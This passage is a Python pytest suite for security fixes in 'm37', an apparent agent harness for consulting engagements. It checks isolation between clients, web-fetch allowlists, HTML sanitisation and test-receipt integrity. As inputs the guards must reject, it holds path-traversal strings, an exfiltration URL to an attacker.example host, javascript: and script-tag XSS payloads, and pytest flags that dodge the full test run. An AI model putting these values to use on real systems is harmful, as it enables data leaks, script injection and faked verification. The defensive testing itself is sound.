"""Regression and security-invariant tests for the 2026-11-16 inspection handoff (H1–H10 + low-severity fixes)."""

from __future__ import annotations

import json
import os
import threading
import time
from pathlib import Path
from typing import Any

import pytest
from typer.testing import CliRunner

import m37
from m37.cli import (
    ClientLeakInCapitalError,
    app,
    approve_gate,
    bless_finding,
    close_engagement,
    create_new_engagement,
    generate_plan_from_archetype,
    init_workspace,
    run_engagement,
)
from m37.compiler import CompilerAbortError, _numeric_variants, compile_deliverable
from m37.config import PrivacyGateError, WorkspacePaths, check_privacy_gate, load_model_catalog
from m37.gates import HumanGateError, evaluate_gate_2
from m37.guards import (
    AgentExecutionContext,
    ExecutionGuard,
    PermissionDeniedError,
    compute_code_tree_sha256,
    register_snapshot,
    resolve_artifact_by_id,
    sha256_file,
    write_utf8_lf,
)
from m37.harness import M37_SKILL_MARKDOWN, _upsert_codex_config_toml
from m37.mcp_server import _ensure_index, handle_jsonrpc_request
from m37.router import compute_episodic_rejection_rates
from m37.runner import append_episodic_event, execute_stateless_node_loop
from m37.schemas import (
    ContractValidationError,
    NodeContract,
    dump_markdown_note,
    parse_raw_artifact,
    validate_artifact_content,
)
from m37.verify import RECEIPT_FILENAME, verify_derivation_phase_a

PAID_ENV = {"GEMINI_API_KEY": "test-gemini", "M37_DATA_PRIVACY_ACK": "paid_billing"}


def _mcp_call(name: str, arguments: dict[str, Any], *, vault: Path) -> dict[str, Any]:
    resp = handle_jsonrpc_request(
        {"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": name, "arguments": arguments}},
        vault=str(vault),
    )
    assert resp is not None and "result" in resp, f"MCP invalid response: {resp}"
    assert resp["result"]["isError"] is False, resp["result"]["content"][0]["text"]
    return json.loads(resp["result"]["content"][0]["text"])


def _mcp_error(name: str, arguments: dict[str, Any], *, vault: Path) -> str:
    resp = handle_jsonrpc_request(
        {"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": name, "arguments": arguments}},
        vault=str(vault),
    )
    assert resp is not None
    if "error" in resp:
        return str(resp["error"])
    assert resp["result"]["isError"] is True, f"Expected MCP error, got: {resp}"
    return str(resp["result"]["content"][0]["text"])


def _setup_two_node_evidence_and_script(
    ws,
    enc_id: str,
    *,
    client: str = "ACME",
    rigor: str = "L3",
    script_body: str = 'import json\nprint(json.dumps({"monto": 1200}))\n',
    metadatos_metodo: dict[str, Any] | None = None,
    ev_url: str | None = "https://datos.ejemplo.org/informe",
    finding_body_extra: str = "Se validó el flujo estimado del ejercicio.",
    valores_anclados: dict[str, Any] | None = None,
    promovible_a_capital: bool = False,
) -> tuple[Path, Path, Path]:
    """Create approved engagement with snapshot-verified EI-*, script-backed D-*, and H-*."""
    create_new_engagement(ws, enc_id, client, rigor=rigor, pregunta="¿Viabilidad operativa del proyecto evaluado?")
    approve_gate(ws, enc_id, 1, approver="socia")
    generate_plan_from_archetype(ws, enc_id, archetype_name="ARQ_Analisis-Cuantitativo", harness_mode=True)
    approve_gate(ws, enc_id, 2, approver="socia")

    snap_abs = ws.workspace_root / f"referencias/{enc_id}/fuente.txt"
    quote = "La demanda anual confirmada permite escalar operaciones."
    write_utf8_lf(snap_abs, quote + "\n")
    register_snapshot(ws, snap_abs, "ingesta_humana", author="socia", url=ev_url)

    doc_guard = ExecutionGuard(
        ws,
        AgentExecutionContext(engagement_id=enc_id, client_id=client, node_id="N-01", profile="documental"),
    )
    ev_id = "EI-FUENTE-01"
    ev_meta: dict[str, Any] = {
        "id": ev_id,
        "tipo": "evidencia",
        "visibilidad": "interna_encargo",
        "encargo_origen": enc_id,
        "clase": "mercado",
        "titulo": "Encuesta Sectorial",
        "emisor_o_autor": "Instituto Base",
        "fecha_publicacion": "2026-06",
        "fecha_verificacion": "2026-10-01",
        "vigencia_dias_max": 365,
        "snapshot_local": f"referencias/{enc_id}/fuente.txt",
        "localizador_verificable": "Tabla alfa, sec. beta",
        "fiabilidad": "alta",
        "cita_verificada": True,
    }
    if ev_url is not None and str(ev_url).startswith(("http://", "https://")):
        ev_meta["url"] = ev_url
    ev_rel = f"vault/20_Encargos/{enc_id}/Evidencia_Interna/{ev_id}.md"
    doc_guard.write_note(
        ev_rel,
        dump_markdown_note(
            ev_meta,
            f'## Síntesis sustantiva\n\nRespaldo base.\n\n## Extracto o referencia verificable\n\n"{quote}"\n\n## Límites y sesgos de la fuente\n\nMuestra regional.\n',
        ),
    )
    ev_abs = ws.workspace_root / ev_rel

    ana_guard = ExecutionGuard(
        ws,
        AgentExecutionContext(engagement_id=enc_id, client_id=client, node_id="N-02", profile="analitico"),
    )
    script_rel = f"analisis/{enc_id}/modelo.py"
    ana_guard.write_sandbox_script(script_rel, script_body)
    run_res = ana_guard.run_sandbox_script(script_rel)
    assert run_res["exit_code"] == 0, run_res["stderr"]
    salidas = json.loads(run_res["stdout"].strip())

    deriv_id = "D-MODELO-01"
    deriv_rel = f"vault/20_Encargos/{enc_id}/Derivaciones/{deriv_id}.json"
    ana_guard.write_note(
        deriv_rel,
        json.dumps(
            {
                "id": deriv_id,
                "tipo": "derivacion",
                "encargo": enc_id,
                "metodo": "matriz-comparativa-alternativas",
                "productor_modo": "script",
                "productor_ref": script_rel,
                "productor_sha256": sha256_file(ws.workspace_root / script_rel),
                "insumos": [{"id_o_ruta": ev_id, "sha256": sha256_file(ev_abs)}],
                "salidas": salidas,
                "metadatos_metodo": metadatos_metodo or {},
            },
            ensure_ascii=False,
            indent=2,
        ),
    )
    deriv_abs = ws.workspace_root / deriv_rel

    fid = f"H-{enc_id}-01"
    f_rel = f"vault/20_Encargos/{enc_id}/Hallazgos/{fid}.md"
    ana_guard.write_note(
        f_rel,
        dump_markdown_note(
            {
                "id": fid,
                "tipo": "hallazgo",
                "encargo": enc_id,
                "dominio": "estrategia-base",
                "naturaleza": "empirico",
                "afirmacion_corta": "La alternativa evaluada cumple con el volumen requerido.",
                "sustento_evidencia": [f"[[{ev_id}]]"],
                "sustento_derivaciones": [f"[[{deriv_id}]]"],
                "metodo": "matriz-comparativa-alternativas",
                "valores_anclados": valores_anclados if valores_anclados is not None else salidas,
                "confianza": "alta",
                "contrahipotesis_probadas": 1,
                "que_lo_refutaria": "Que una auditoría externa desmienta el volumen base reportado.",
                "promovible_a_capital": promovible_a_capital,
                "estado_qa": "pendiente",
            },
            (
                f"## Afirmación\n\n{finding_body_extra}\n\n"
                f"## Sustento y trazabilidad\n\nSustentado en [[{ev_id}]] y [[{deriv_id}]].\n\n"
                "## Explicaciones rivales descartadas\n\nDescartada anomalía estacional.\n\n"
                "## Condiciones de validez y límites\n\nSolo mercado base.\n"
            ),
        ),
    )
    return ev_abs, deriv_abs, ws.workspace_root / f_rel


# ----------------------------------------------------------------------------------------------------------------------
# H1 — resolve_artifact_by_id, FindingContract, InputHashRef traversal & cross-engagement isolation
# ----------------------------------------------------------------------------------------------------------------------
def test_h1_cross_engagement_and_traversal_blocked(tmp_path: Path) -> None:
    ws = init_workspace(tmp_path / "ws_h1")
    create_new_engagement(ws, "ENC-A", "CLI_A", rigor="L3")
    create_new_engagement(ws, "ENC-B", "CLI_B", rigor="L3")

    ev_b = ws.engagement_dir("ENC-B") / "Evidencia_Interna" / "EI-ENC-B-01.md"
    write_utf8_lf(
        ev_b,
        dump_markdown_note(
            {
                "id": "EI-ENC-B-01",
                "tipo": "evidencia",
                "visibilidad": "interna_encargo",
                "encargo_origen": "ENC-B",
                "clase": "mercado",
                "titulo": "Secreto de Cliente B",
                "emisor_o_autor": "B",
                "fecha_publicacion": "2026-09",
                "fecha_verificacion": "2026-10-01",
                "vigencia_dias_max": 365,
                "localizador_verificable": "p. 1",
                "fiabilidad": "alta",
            },
            "Confidencial Cliente B.\n",
        ),
    )

    for bad_sustento in (
        "../../ENC-B/Evidencia_Interna/EI-ENC-B-01",
        "vault/10_Clientes/CLI_B/Perfil.md",
        "[[vault/20_Encargos/ENC-B/Evidencia_Interna/EI-ENC-B-01.md]]",
        "EI\\..\\ENC-B",
    ):
        bad_finding = dump_markdown_note(
            {
                "id": "H-ENC-A-01",
                "tipo": "hallazgo",
                "encargo": "ENC-A",
                "dominio": "estrategia-base",
                "naturaleza": "empirico",
                "afirmacion_corta": "Intento de cruce de encargo.",
                "sustento_evidencia": [bad_sustento],
                "sustento_derivaciones": [],
                "metodo": "matriz-comparativa-alternativas",
                "confianza": "alta",
                "contrahipotesis_probadas": 1,
                "que_lo_refutaria": "Cualquier auditoría de aislamiento valida el rechazo.",
            },
            (
                "## Afirmación\n\nCuerpo.\n\n## Sustento y trazabilidad\n\nRef.\n\n"
                "## Explicaciones rivales descartadas\n\nNinguna.\n\n"
                "## Condiciones de validez y límites\n\nNinguna.\n"
            ),
        )
        with pytest.raises(ContractValidationError):
            validate_artifact_content(bad_finding, suffix=".md", expected_tipo="hallazgo")

    for bad_input in (
        "vault/10_Clientes/CLI_B/Perfil.md",
        "[[vault/10_Clientes/CLI_B/Perfil.md]]",
        "vault/90_Bitacora/episodios.jsonl",
        "datos/ENC-B/data.csv",
        "../../ENC-B/Evidencia_Interna/EI-ENC-B-01",
    ):
        bad_deriv = json.dumps(
            {
                "id": "D-ENC-A-01",
                "tipo": "derivacion",
                "encargo": "ENC-A",
                "metodo": "matriz-comparativa-alternativas",
                "productor_modo": "estructuracion_analitica",
                "productor_ref": "analisis/ENC-A",
                "insumos": [{"id_o_ruta": bad_input, "sha256": "a" * 64}],
                "salidas": {"etiqueta": "solo cualitativo"},
            }
        )
        with pytest.raises(ContractValidationError):
            validate_artifact_content(bad_deriv, suffix=".json", expected_tipo="derivacion")

    for bad_ref in (
        "../../ENC-B/Evidencia_Interna/EI-ENC-B-01",
        "../../10_Clientes/CLI_B/Perfil.md",
        "../../90_Bitacora/episodios.jsonl",
    ):
        with pytest.raises((PermissionError, ContractValidationError, FileNotFoundError)):
            resolve_artifact_by_id(ws, "ENC-A", bad_ref)


# ----------------------------------------------------------------------------------------------------------------------
# H2 — Snapshot rollback preserves user/Obsidian files + configurable node timeout
# ----------------------------------------------------------------------------------------------------------------------
def test_h2_sandbox_preserves_third_party_and_obsidian_files_and_node_timeout(tmp_path: Path) -> None:
    ws = init_workspace(tmp_path / "ws_h2")
    enc_id = "ENC-H2-01"
    create_new_engagement(ws, enc_id, "ACME", rigor="L2")
    approve_gate(ws, enc_id, 1, approver="socia")
    _, node_paths = generate_plan_from_archetype(ws, enc_id, archetype_name="ARQ_Analisis-Cuantitativo", harness_mode=True)

    # Default archetype timeout propagated onto generated nodes
    n_meta, _ = parse_raw_artifact(node_paths[1].read_text(encoding="utf-8"), suffix=".md")
    assert n_meta["timeout_segundos"] == 60

    # Schema bounds for timeout_segundos
    n_meta["timeout_segundos"] = 180
    n_obj, _, _ = validate_artifact_content(dump_markdown_note(n_meta, "Body\n"), suffix=".md", expected_tipo="nodo")
    assert isinstance(n_obj, NodeContract) and n_obj.timeout_segundos == 180

    for bad_timeout in (4, 601):
        n_meta_bad = dict(n_meta, timeout_segundos=bad_timeout)
        with pytest.raises(ContractValidationError):
            validate_artifact_content(dump_markdown_note(n_meta_bad, "Body\n"), suffix=".md", expected_tipo="nodo")

    obsidian_ws = ws.vault_root / ".obsidian" / "workspace.json"
    write_utf8_lf(obsidian_ws, '{"open": ["00_Brief.md"]}\n')
    third_party_note = ws.vault_root / "Nota_Usuario.md"

    ana_guard = ExecutionGuard(
        ws,
        AgentExecutionContext(
            engagement_id=enc_id,
            client_id="ACME",
            node_id="N-02",
            profile="analitico",
            default_timeout_s=180,
        ),
    )
    script_rel = f"analisis/{enc_id}/concurrent_wait.py"
    ana_guard.write_sandbox_script(
        script_rel,
        "import json, time\ntime.sleep(0.45)\nprint(json.dumps({'ok': 1}))\n",
    )

    def _third_party_writer() -> None:
        time.sleep(0.10)
        write_utf8_lf(obsidian_ws, '{"open": ["01_Plan.md"], "active": true}\n')
        write_utf8_lf(third_party_note, "# Nota humana creada durante ejecución\n")

    t = threading.Thread(target=_third_party_writer, daemon=True)
    t.start()
    res = ana_guard.run_sandbox_script(script_rel)
    t.join(timeout=5)

    assert res["exit_code"] == 0
    assert third_party_note.is_file(), "El snapshot borró un archivo legítimo creado por un tercero"
    assert "Nota humana" in third_party_note.read_text(encoding="utf-8")
    assert '"active": true' in obsidian_ws.read_text(encoding="utf-8")


# ----------------------------------------------------------------------------------------------------------------------
# H3 — SDD verification blocks partial pytest runs and skipped/missing RF tests in JUnit receipt
# ----------------------------------------------------------------------------------------------------------------------
def test_h3_sdd_verification_blocks_partial_pytest_and_skipped_rf_tests(tmp_path: Path) -> None:
    ws = init_workspace(tmp_path / "ws_h3")
    enc_id = "ENC-H3-01"
    create_new_engagement(ws, enc_id, "ACME", rigor="L3")

    spec_rel = f"vault/20_Encargos/{enc_id}/Evidencia_Interna/EI-SPEC-01.md"
    doc_guard = ExecutionGuard(
        ws,
        AgentExecutionContext(engagement_id=enc_id, client_id="ACME", node_id="N-01", profile="documental"),
    )
    spec_text = (
        "Cuando se invoque `doble(x)`, el sistema deberá retornar `2 * x` (RF-01).\n"
        "Cuando `x < 0`, el sistema deberá lanzar ValueError (RF-02).\n"
    )
    snap = ws.workspace_root / f"referencias/{enc_id}/spec.txt"
    write_utf8_lf(snap, spec_text)
    register_snapshot(ws, snap, "ingesta_humana", author="socia")
    doc_guard.write_note(
        spec_rel,
        dump_markdown_note(
            {
                "id": "EI-SPEC-01",
                "tipo": "evidencia",
                "visibilidad": "interna_encargo",
                "encargo_origen": enc_id,
                "clase": "normativa",
                "titulo": "Spec EARS H3",
                "emisor_o_autor": "Producto",
                "fecha_publicacion": "2026-10",
                "fecha_verificacion": "2026-10-15",
                "vigencia_dias_max": 365,
                "snapshot_local": f"referencias/{enc_id}/spec.txt",
                "localizador_verificable": "Sec 1",
                "fiabilidad": "alta",
                "cita_verificada": True,
            },
            f'## Síntesis sustantiva\n\nSpec.\n\n## Extracto o referencia verificable\n\n"{spec_text.strip()}"\n\n## Límites y sesgos de la fuente\n\nNinguno.\n',
        ),
    )

    build_guard = ExecutionGuard(
        ws,
        AgentExecutionContext(engagement_id=enc_id, client_id="ACME", node_id="N-02", profile="construccion"),
    )
    build_guard.write_code_file("app.py", "def doble(x: int) -> int:\n    return x * 2\n")
    build_guard.write_code_file(
        "test_app.py",
        "import pytest\nfrom app import doble\n\n"
        "def test_rf01():\n    assert doble(3) == 6\n\n"
        "@pytest.mark.skip(reason='aun no implementado')\n"
        "def test_rf02():\n    assert False\n",
    )

    for bad_cmd in (
        "pytest -k test_rf01",
        "pytest --deselect test_app.py::test_rf02",
        "pytest --ignore=test_app.py",
        "pytest --junitxml=evil.xml",
        "pytest test_app.py",
    ):
        with pytest.raises(PermissionDeniedError):
            build_guard.run_verification_cmd(bad_cmd)

    receipt = build_guard.run_verification_cmd("pytest -q")
    assert receipt["exit_code"] == 0
    assert receipt["full_suite"] is True
    assert "test_rf01" in receipt["passed_tests"]
    assert "test_rf02" not in receipt["passed_tests"]

    code_dir = ws.codigo_root / enc_id
    deriv_rel = f"vault/20_Encargos/{enc_id}/Derivaciones/D-H3-01.json"
    build_guard.write_note(
        deriv_rel,
        json.dumps(
            {
                "id": "D-H3-01",
                "tipo": "derivacion",
                "encargo": enc_id,
                "metodo": "sdd-ears-tdd",
                "productor_modo": "verificacion_codigo",
                "productor_ref": f"codigo/{enc_id}",
                "productor_sha256": compute_code_tree_sha256(code_dir),
                "insumos": [{"id_o_ruta": "EI-SPEC-01", "sha256": sha256_file(ws.workspace_root / spec_rel)}],
                "salidas": {
                    "cobertura_rf": {
                        "RF-01": ["test_app.py::test_rf01"],
                        "RF-02": ["test_app.py::test_rf02"],
                    }
                },
            }
        ),
    )
    deriv_abs = ws.workspace_root / deriv_rel
    res_skip = verify_derivation_phase_a(ws, enc_id, deriv_abs, rigor="L3")
    assert not res_skip.passed
    assert any("no figura como 'passed'" in err for err in res_skip.errors)

    # Also fail if full_suite flag in receipt is false
    rpath = code_dir / RECEIPT_FILENAME
    tampered_receipt = json.loads(rpath.read_text(encoding="utf-8"))
    tampered_receipt["full_suite"] = False
    rpath.write_text(json.dumps(tampered_receipt), encoding="utf-8")
    res_partial = verify_derivation_phase_a(ws, enc_id, deriv_abs, rigor="L3")
    assert not res_partial.passed
    assert any("full_suite=false" in err for err in res_partial.errors)


# ----------------------------------------------------------------------------------------------------------------------
# H4 — Compiler numeric anchoring: US/MX vs EU thousands separators, no metadatos_metodo leak, no embedded quant strings
# ----------------------------------------------------------------------------------------------------------------------
def test_h4_compiler_numeric_anchoring_locale_metadatos_and_estructuracion(tmp_path: Path) -> None:
    assert "1200" in _numeric_variants("1,200")
    assert "1.2" not in _numeric_variants("1,200")
    assert {"28500.5", "28500.50"} <= _numeric_variants("28,500.50")
    assert {"1200.5", "1200.50"} <= _numeric_variants("1.200,50")

    # 1. estructuracion_analitica rejects embedded quantitative text
    for bad_text in ("aprox. 37%", "cuota: 37%", "costo USD 1,200"):
        bad_deriv = json.dumps(
            {
                "id": "D-NUM-BAD",
                "tipo": "derivacion",
                "encargo": "ENC-H4",
                "metodo": "matriz-comparativa-alternativas",
                "productor_modo": "estructuracion_analitica",
                "productor_ref": "analisis/ENC-H4",
                "insumos": [{"id_o_ruta": "00_Brief.md", "sha256": "a" * 64}],
                "salidas": {"resumen": bad_text},
            }
        )
        with pytest.raises(ContractValidationError):
            validate_artifact_content(bad_deriv, suffix=".json", expected_tipo="derivacion")

    # 2. "USD 1,200M" must NOT anchor against script output {"monto": 1.2}
    ws_fn = init_workspace(tmp_path / "ws_h4_fn")
    enc_fn = "ENC-H4-FN"
    _setup_two_node_evidence_and_script(
        ws_fn,
        enc_fn,
        script_body='import json\nprint(json.dumps({"monto": 1.2}))\n',
        finding_body_extra="Estimación base evaluada en rango mínimo.",
        valores_anclados={"monto": 1.2},
    )
    bless_finding(ws_fn, enc_fn, f"H-{enc_fn}-01", "Revisión completa H4 aprobada por auditoría.")
    edit_guard = ExecutionGuard(
        ws_fn,
        AgentExecutionContext(engagement_id=enc_fn, client_id="ACME", node_id="N-03", profile="editorial"),
    )
    edit_guard.write_note(
        f"vault/20_Encargos/{enc_fn}/Entregables/Informe.md",
        dump_markdown_note(
            {"titulo": "Informe H4 FN"},
            f"## Resumen\n\nEl costo observado fue USD 1,200M. <!-- sustento: H-{enc_fn}-01 -->\n",
        ),
    )
    with pytest.raises(CompilerAbortError, match="sin anclaje verificable"):
        compile_deliverable(ws_fn, enc_fn, deliverable_name="Informe.md")

    # 3. "USD 1,200M" DOES anchor against script output {"monto": 1200},
    #    while "88%" present only in metadatos_metodo must NOT anchor.
    ws_ok = init_workspace(tmp_path / "ws_h4_ok")
    enc_ok = "ENC-H4-OK"
    _setup_two_node_evidence_and_script(
        ws_ok,
        enc_ok,
        script_body='import json\nprint(json.dumps({"monto": 1200}))\n',
        metadatos_metodo={"benchmark_externo": "88%"},
        finding_body_extra="El flujo analizado valida el modelo base.",
        valores_anclados={"monto": 1200},
    )
    bless_finding(ws_ok, enc_ok, f"H-{enc_ok}-01", "Revisión completa H4 OK aprobada por auditoría.")
    ed_ok = ExecutionGuard(
        ws_ok,
        AgentExecutionContext(engagement_id=enc_ok, client_id="ACME", node_id="N-03", profile="editorial"),
    )
    ed_ok.write_note(
        f"vault/20_Encargos/{enc_ok}/Entregables/Informe.md",
        dump_markdown_note(
            {"titulo": "Informe H4"},
            f"## Resumen\n\nEl presupuesto aprobado fue USD 1,200M. <!-- sustento: H-{enc_ok}-01 -->\n",
        ),
    )
    compiled = compile_deliverable(ws_ok, enc_ok, deliverable_name="Informe.md")
    assert compiled.html_path.is_file()

    # Inject "88%" from metadatos_metodo into prose -> MUST fail anchoring
    ed_ok.write_note(
        f"vault/20_Encargos/{enc_ok}/Entregables/Informe.md",
        dump_markdown_note(
            {"titulo": "Informe H4 Leak"},
            f"## Resumen\n\nEl presupuesto fue USD 1,200M con meta de 88%. <!-- sustento: H-{enc_ok}-01 -->\n",
        ),
    )
    with pytest.raises(CompilerAbortError, match="88"):
        compile_deliverable(ws_ok, enc_ok, deliverable_name="Informe.md")


# ----------------------------------------------------------------------------------------------------------------------
# H5 — close_engagement alias detection in Perfil.md + cli_close promote_capital=False default & interactive human gate
# ----------------------------------------------------------------------------------------------------------------------
def test_h5_close_aliases_from_perfil_and_cli_promote_capital_opt_in_and_human(tmp_path: Path) -> None:
    ws = init_workspace(tmp_path / "ws_h5")
    enc_id = "ENC-H5-01"
    _, _, f_abs = _setup_two_node_evidence_and_script(
        ws,
        enc_id,
        finding_body_extra="El modelo para Proyecto Fenix mejora el flujo base.",
        promovible_a_capital=True,
    )
    perfil = ws.vault_root / "10_Clientes" / "ACME" / "Perfil.md"
    write_utf8_lf(
        perfil,
        dump_markdown_note(
            {"tipo": "cliente", "id": "ACME", "alias": ["AcmeCorp", "Proyecto Fenix"]},
            "# Perfil Cliente\n\n- Razón social: Comercializadora Norte S.A.\n",
        ),
    )
    bless_finding(ws, enc_id, f"H-{enc_id}-01", "Aprobado para prueba de alias H5.")

    with pytest.raises(ClientLeakInCapitalError, match="Proyecto Fenix"):
        close_engagement(ws, enc_id)

    # Replace client alias, re-bless, and test CLI defaults
    sanitized_text = f_abs.read_text(encoding="utf-8").replace("Proyecto Fenix", "Operador Sectorial")
    write_utf8_lf(f_abs, sanitized_text)
    bless_finding(ws, enc_id, f"H-{enc_id}-01", "Re-aprobado tras anonimizar alias de cliente.")

    runner = CliRunner()
    res_default = runner.invoke(app, ["close", enc_id, "--vault", str(ws.workspace_root)])
    assert res_default.exit_code == 0, res_default.output
    assert "capital_promovido" in res_default.output
    assert not any((ws.vault_root / "50_Capital").glob("CAP-*.md"))

    res_promote = runner.invoke(app, ["close", enc_id, "--promote-capital", "--vault", str(ws.workspace_root)])
    assert res_promote.exit_code != 0
    assert isinstance(res_promote.exception, HumanGateError)


# ----------------------------------------------------------------------------------------------------------------------
# H6 — web_fetch_clean: allowlist before DNS, charset decoding, final URL, reject binary Content-Type
# ----------------------------------------------------------------------------------------------------------------------
def test_h6_web_fetch_clean_policy_before_dns_charset_pdf_and_final_url(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    import m37.guards as guards_mod

    ws = init_workspace(tmp_path / "ws_h6")
    guard = ExecutionGuard(
        ws,
        AgentExecutionContext(
            engagement_id="ENC-H6",
            client_id="ACME",
            node_id="N-01",
            profile="documental",
            web_allowed_domains=("inegi.org.mx",),
            web_requires_allowlist=True,
        ),
    )

    dns_calls: list[str] = []

    def _spy_validate(url: str) -> str:
        dns_calls.append(url)
        return "93.184.216.34"

    monkeypatch.setattr(guards_mod, "_validate_public_http_url", _spy_validate)

    # Disallowed domain fails BEFORE DNS resolution
    with pytest.raises(PermissionDeniedError, match="dominios_web_permitidos"):
        guard.web_fetch_clean("https://secret-exfil.attacker.example/leak?data=abc")
    assert dns_calls == []

    # Disallowed scheme hits "Esquema URL prohibido" BEFORE DNS
    with pytest.raises(PermissionDeniedError, match="Esquema URL prohibido"):
        guard.web_fetch_clean("ftp://inegi.org.mx/archivo.txt")
    assert dns_calls == []

    # Fake HTTP response with redirect URL and iso-8859-1 charset
    class _FakeResp:
        def __init__(self, body: bytes, content_type: str, final_url: str) -> None:
            self._body = body
            self.headers = {"Content-Type": content_type}
            self._final_url = final_url

        def geturl(self) -> str:
            return self._final_url

        def read(self, _limit: int = -1) -> bytes:
            return self._body

        def __enter__(self) -> _FakeResp:
            return self

        def __exit__(self, *args: object) -> None:
            return None

    class _FakeOpener:
        def __init__(self, resp: _FakeResp) -> None:
            self._resp = resp

        def open(self, req, timeout: int = 20) -> _FakeResp:  # noqa: ARG002
            return self._resp

    monkeypatch.setattr(
        guards_mod,
        "build_pinned_opener",
        lambda _pins, _handler: _FakeOpener(
            _FakeResp(
                "<p>Población México 2026</p>".encode("iso-8859-1"),
                "text/html; charset=iso-8859-1",
                "https://datos.inegi.org.mx/censo/final",
            )
        ),
    )
    fetched = guard.web_fetch_clean("https://inegi.org.mx/censo")
    assert "Población México 2026" in fetched
    reg = json.loads((ws.referencias_root / ".m37_snapshots.json").read_text(encoding="utf-8"))
    urls = [rec.get("url") for rec in reg.values() if isinstance(rec, dict)]
    assert "https://datos.inegi.org.mx/censo/final" in urls

    # Binary Content-Type (application/pdf) is rejected
    monkeypatch.setattr(
        guards_mod,
        "build_pinned_opener",
        lambda _pins, _handler: _FakeOpener(
            _FakeResp(b"%PDF-1.7...", "application/pdf", "https://inegi.org.mx/doc.pdf")
        ),
    )
    with pytest.raises(PermissionDeniedError, match="Content-Type"):
        guard.web_fetch_clean("https://inegi.org.mx/doc.pdf")


# ----------------------------------------------------------------------------------------------------------------------
# H7 — Evidence URL scheme validation & HTML output sanitization on footnotes and body
# ----------------------------------------------------------------------------------------------------------------------
def test_h7_evidence_url_scheme_and_final_html_sanitization(tmp_path: Path) -> None:
    for bad_url in ("javascript:alert(1)", "data:text/html,<script>alert(1)</script>"):
        bad_ev = dump_markdown_note(
            {
                "id": "EI-H7-01",
                "tipo": "evidencia",
                "visibilidad": "interna_encargo",
                "encargo_origen": "ENC-H7",
                "clase": "dato",
                "titulo": "Fuente XSS",
                "emisor_o_autor": "Externo",
                "fecha_publicacion": "2026-10",
                "fecha_verificacion": "2026-10-10",
                "vigencia_dias_max": 180,
                "localizador_verificable": "p. 1",
                "fiabilidad": "media",
                "url": bad_url,
            },
            "Contenido.\n",
        )
        with pytest.raises(ContractValidationError):
            validate_artifact_content(bad_ev, suffix=".md", expected_tipo="evidencia")

    ws = init_workspace(tmp_path / "ws_h7")
    enc_id = "ENC-H7-01"
    _setup_two_node_evidence_and_script(ws, enc_id)
    bless_finding(ws, enc_id, f"H-{enc_id}-01", "Aprobado H7 para validación de compilador HTML.")

    ed = ExecutionGuard(
        ws,
        AgentExecutionContext(engagement_id=enc_id, client_id="ACME", node_id="N-03", profile="editorial"),
    )
    ed.write_note(
        f"vault/20_Encargos/{enc_id}/Entregables/Informe.md",
        dump_markdown_note(
            {"titulo": "Informe H7 Bad"},
            (
                "## Conclusión\n\n"
                f"El resultado es USD 1,200M [link](javascript:alert(2)). <!-- sustento: H-{enc_id}-01 -->\n"
            ),
        ),
    )
    with pytest.raises(CompilerAbortError, match="esquema no permitido"):
        compile_deliverable(ws, enc_id, deliverable_name="Informe.md")

    ed.write_note(
        f"vault/20_Encargos/{enc_id}/Entregables/Informe.md",
        dump_markdown_note(
            {"titulo": "Informe H7 OK"},
            f"## Conclusión\n\nEl resultado es USD 1,200M. <!-- sustento: H-{enc_id}-01 -->\n",
        ),
    )
    compiled = compile_deliverable(ws, enc_id, deliverable_name="Informe.md")
    rendered_html = compiled.html_path.read_text(encoding="utf-8")
    assert "javascript:" not in rendered_html.lower()
    assert 'href="https://datos.ejemplo.org/informe"' in rendered_html
    assert "Encuesta Sectorial" in rendered_html

    from m37.compiler import HTML_UNSAFE_HREF_RE

    sanitized_fn = HTML_UNSAFE_HREF_RE.sub(
        lambda m: f'{m.group(1)}="#"',
        '<footer><a href="javascript:alert(1)">Enlace</a></footer>',
    )
    assert "javascript:" not in sanitized_fn.lower() and 'href="#"' in sanitized_fn


# ----------------------------------------------------------------------------------------------------------------------
# H8 — Case-insensitive Chinese Wall & episodic memory guards
# ----------------------------------------------------------------------------------------------------------------------
def test_h8_case_insensitive_chinese_wall_and_episodic_memory(tmp_path: Path) -> None:
    ws = init_workspace(tmp_path / "ws_h8")
    create_new_engagement(ws, "ENC-A", "CLI_A", rigor="L2")
    create_new_engagement(ws, "ENC-B", "CLI_B", rigor="L2")
    write_utf8_lf(ws.engagement_dir("ENC-B") / "Evidencia_Interna" / "EI-ENC-B-01.md", "Secreto.\n")
    write_utf8_lf(ws.vault_root / "10_Clientes" / "CLI_B" / "Perfil.md", "# Cliente B\n")
    write_utf8_lf(ws.episodios_path(), '{"evento": "privado"}\n')

    guard = ExecutionGuard(
        ws,
        AgentExecutionContext(engagement_id="ENC-A", client_id="CLI_A", node_id="N-01", profile="documental"),
    )
    for mixed_case_path in (
        "VAULT/20_ENCARGOS/enc-b/Evidencia_Interna/EI-ENC-B-01.md",
        "vault/10_clientes/cli_b/Perfil.md",
        "VAULT/90_bitacora/episodios.jsonl",
    ):
        with pytest.raises(PermissionDeniedError):
            guard.read_file(mixed_case_path)


# ----------------------------------------------------------------------------------------------------------------------
# H9 — Exact/-base domain match in router + L1 run without QA model leaves QA fields None
# ----------------------------------------------------------------------------------------------------------------------
def test_h9_router_domain_match_exact_and_l1_run_does_not_fake_qa_accept(tmp_path: Path) -> None:
    ws = init_workspace(tmp_path / "ws_h9")
    for _ in range(5):
        append_episodic_event(
            ws.episodios_path(),
            {
                "evento": "nodo_ejecutado",
                "encargo": "PREV-01",
                "dominio": "retail-salud",
                "metodo": "matriz-comparativa-alternativas",
                "modelo": "gemini_pro",
                "aprobado_r1": False,
            },
        )
        append_episodic_event(
            ws.episodios_path(),
            {
                "evento": "nodo_ejecutado",
                "encargo": "PREV-02",
                "dominio": "estrategia-base",
                "metodo": "matriz-comparativa-alternativas",
                "modelo": "gemini_flash",
                "aprobado_r1": False,
            },
        )

    assert compute_episodic_rejection_rates(ws.episodios_path(), dominio="ret") == {}
    assert compute_episodic_rejection_rates(ws.episodios_path(), dominio="retail") == {}
    strat_rates = compute_episodic_rejection_rates(ws.episodios_path(), dominio="estrategia")
    assert "gemini_flash" in strat_rates and strat_rates["gemini_flash"][0] == 1.0

    # L1 engagement without QA model runs N-01 (documental) -> N-02 (analitico) without stamping estado_qa="aprobado"
    enc_l1 = "ENC-H9-L1"
    create_new_engagement(ws, enc_l1, "ACME", rigor="L1")
    approve_gate(ws, enc_l1, 1, approver="socia")
